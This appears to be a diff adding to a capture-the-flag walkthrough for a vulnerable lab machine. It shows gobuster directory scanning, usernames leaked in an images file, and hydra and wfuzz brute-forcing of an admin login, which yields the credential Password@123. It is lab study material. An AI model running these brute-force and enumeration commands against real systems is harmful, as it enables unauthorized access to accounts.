@@ -52,3 +52,66 @@ PORT     STATE SERVICE VERSION
 |_http-title: NIVEL 1
 5355/tcp open  llmnr?
 ```
+
+Port 80 has a static website nothing interesting, let's run a `gobuster` scan.
+
+```
+$ gobuster dir -q -u http://$ip/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html
+/index.html (Status: 200)
+/images (Status: 301)
+/admin (Status: 301)
+/css (Status: 301)
+/js (Status: 301)
+/vendor (Status: 301)
+/fonts (Status: 301)
+```
+
+`/admin` has a login page, tried some classic stuff like `admin:admin` `guest:guest` etc but nothing. I checked the `/images` folder and i found a file called `Flag.txt.txt` this file has 2 possible usernames in:
+
+```
+$ curl http://192.168.1.17/images/Flag.txt.txt
+EASY EASY EASY
+
+Zipperman is cool!
+
+Bucciarati
+```
+
+Let's fire up hydra on login page. Here is the stupid part.. we have to wait l000000000000000ng time to get the password because the password is in line `1044216` :
+
+```
+$ cat /usr/share/wordlists/rockyou.txt | grep -n "Password@123" 
+1044216:Password@123
+```
+
+Just grab it and save your time. :smile: I'll make another wordlist with this password in to show you the hydra command.
+
+```
+$ hydra -l Zipperman -P wordlist.txt $ip http-post-form "/admin/index.php:username=Zipperman&pass=^PASS^:Login Failed"
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-24 00:40:34
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 4 login tries (l:1/p:4), ~1 try per task
+[DATA] attacking http-post-form://192.168.1.17:80/admin/index.php:username=Zipperman&pass=^PASS^:Login Failed
+[80][http-post-form] host: 192.168.1.17   login: Zipperman   password: Password@123
+```
+
+You can also use `wfuzz`:
+
+```
+$ wfuzz -c -w wordlist.txt -d "username=Zipperman&pass=FUZZ" --hc 200 http://192.168.1.17/admin/index.php
+
+Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+
+********************************************************
+* Wfuzz 2.4.5 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://192.168.1.17/admin/index.php
+Total requests: 4
+
+===================================================================
+ID           Response   Lines    Word     Chars       Payload                                                                                                                 
+===================================================================
+
+000000004:   302        88 L     176 W    2643 Ch     "Password@123"                   
+```
